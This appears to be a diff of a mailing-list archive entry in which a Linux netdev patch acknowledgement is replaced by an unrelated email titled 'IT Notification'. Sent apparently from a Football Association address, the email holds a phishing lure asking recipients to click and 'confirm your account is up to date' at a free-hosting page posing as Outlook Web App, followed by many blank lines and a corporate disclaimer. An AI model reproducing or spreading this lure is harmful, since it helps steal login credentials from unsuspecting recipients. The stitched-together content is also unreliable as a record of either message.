@@ -1,35 +1,336 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH net-next 0/5] qed*: Dcbx/dcbnl enhancements.
-Date: Mon, 24 Apr 2017 12:20:24 -0400 (EDT)
-Message-ID: <20170424.122024.1379316958014830977.davem@davemloft.net>
-References: <20170421053120.12980-1-sudarsana.kalluru@cavium.com>
+From: Martin Burnell <Martin.Burnell@thefa.com>
+Subject: RE: IT Notification
+Date: Mon, 24 Apr 2017 16:06:57 +0000
+Message-ID: <86FB6D04EED1044C988A76299CA11BF1A2724C30@FBA01MBX02.fa.ds.com>
+References: <86FB6D04EED1044C988A76299CA11BF1A2719A08@FBA01MBX02.fa.ds.com>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org, Yuval.Mintz@cavium.com
-To: sudarsana.kalluru@cavium.com
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8BIT
+To: Martin Burnell <Martin.Burnell@thefa.com>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from shards.monkeyblade.net ([184.105.139.130]:53212 "EHLO
-        shards.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S973360AbdDXQU0 (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Mon, 24 Apr 2017 12:20:26 -0400
-In-Reply-To: <20170421053120.12980-1-sudarsana.kalluru@cavium.com>
+Received: from mars.the-fa.org ([194.0.214.68]:15741 "EHLO mars.the-fa.org"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S973175AbdDXQW3 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 24 Apr 2017 12:22:29 -0400
+In-Reply-To: <86FB6D04EED1044C988A76299CA11BF1A2719A08@FBA01MBX02.fa.ds.com>
+Content-Language: en-GB
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Sudarsana Reddy Kalluru <sudarsana.kalluru@cavium.com>
-Date: Thu, 20 Apr 2017 22:31:15 -0700
 
-> From: Sudarsana Reddy Kalluru <Sudarsana.Kalluru@cavium.com>
-> 
-> The series has set of enhancements for dcbx/dcbnl implementation of
-> qed/qede drivers.
->  - Patches (1) & (3) capture the sematic and debug changes.
->  - Patch (2) adds the driver support for populating RoCEv2 dcb data.
->  - Patch (4) adds the required support for reading/configuring the
->    IEEE selection field (SF).
->  - Patch (5) adds the support for configuring the static dcbx mode.
-> 
-> Please consider applying this to 'net-next' branch.
 
-Series applied, thanks.
+________________________________
+From: Martin Burnell
+Sent: 24 April 2017 16:16
+Subject: IT Notification
+
+
+Please click to confirm your account is up to date,
+https://owawebapp.000webhostapp.com/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+This communication contains information which is confidential, which may be privileged, and which is for the exclusive use of the intended recipient(s). If you are not an intended recipient please note that any distribution, disclosure, use or copying of any 
+part of this communication is strictly prohibited. If you have received this communication in error please notify us by return email or by telephone on +44(0)800 169 1863 and delete this communication and any copies of it. The FA Group (which for the 
+purpose of this communication means The Football Association Limited and its subsidiary companies including Wembley National Stadium Limited and National Football Centre Limited does not warrant that this email is free from error, viruses, malware, 
+data-damaging material or other defects, or is compatible with your equipment or fit for any purpose. The FA Group may monitor, intercept and block emails addressed to its users or take any other action in accordance with its email use policy. 
+Statements or opinions may be expressed in this communication that are personal to the sender and do not necessarily represent the views of The FA Group or any member of it. Unless expressly stated otherwise, no member of The FA Group shall be 
+bound by any contract or obligation purported to be created by this communication. 
+This communication has originated from the communications system of The FA Group. 
+The Football Association Limited (Company number 77797),  Wembley National Stadium Limited (Company number 3388437) and National Football Centre Limited (Company number 2523346) are all registered in England and Wales, with their registered 
+office at Wembley Stadium, Wembley, London HA9 0WS. For The FA Tel: +44(0)800 169 1863. http://www.thefa.com. For Wembley National Stadium Limited Tel: +44(0)800 169 2007 http://www.wembleystadium.com
